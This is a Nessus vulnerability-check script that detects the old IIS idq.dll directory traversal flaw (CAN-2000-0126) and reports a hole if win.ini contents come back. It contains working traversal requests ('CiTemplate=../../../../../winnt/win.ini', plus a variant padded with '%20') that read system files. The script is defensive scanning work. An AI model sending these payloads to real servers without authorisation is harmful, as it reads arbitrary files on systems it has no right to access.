#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10115);
 script_version ("$Revision: 1.12 $");
 script_cve_id("CAN-2000-0126");
 script_bugtraq_id(968);
 name["english"] = "idq.dll directory traversal";
 name["francais"] = "idq.dll directory traversal";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
There is a vulnerability in idq.dll which allows any remote
user to read any file on the target system by doing the request :

	GET http://target/query.idq?CiTemplate=../../../somefile.ext
	

Solution : Microsoft's webhits.dll addresses some of this
           issue. It is available at :
	   http://www.microsoft.com/downloads/release/asp?ReleaseID=17727

Risk factor : High
Bugtraq ID : 968";

 desc["francais"] = "
Il existe une vulnérabilité dans idq.dll qui permet à n'importe quel
utilisateur de lire n'importe quel fichier  sur le site distant en
faisant la requete :

	GET http://target/query.idq?CiTemplate=../../../somefile.ext

Solution : webhits.dll, de Microsoft, corrige ce problème. Il est
           disponible à :
	   http://www.microsoft.com/downloads/release/asp?ReleaseID=17727

Facteur de risque : Elevé
Bugtraq ID : 968";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Attempts to read an arbitrary file";
 summary["francais"] = "Essaye de lire un fichier arbitraire";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/iis");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
port = get_kb_item("Services/www");
if(!port)port = 80;



if(get_port_state(port))
{
 
 base = "/query.idq?CiTemplate=../../../../../winnt/win.ini";

 req1 = http_get(item:base, port:port);
 req2 = http_get(item:string(base, crap(data:"%20", length:300)), port:port);


 soc = http_open_socket(port);
 if(soc)
 {
  send(socket:soc, data:req1);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  if("[fonts]" >< r)
  {
   security_hole(port);
   exit(0);
  }
  soc2 = http_open_socket(port);
  if(!soc2)exit(0);
  send(socket:soc2, data:req2);
  r2 = http_recv(socket:soc2);
  http_close_socket(soc2);
  if("[fonts]" >< r2)
  {
   security_hole(port);
   exit(0);
  }
 }
}
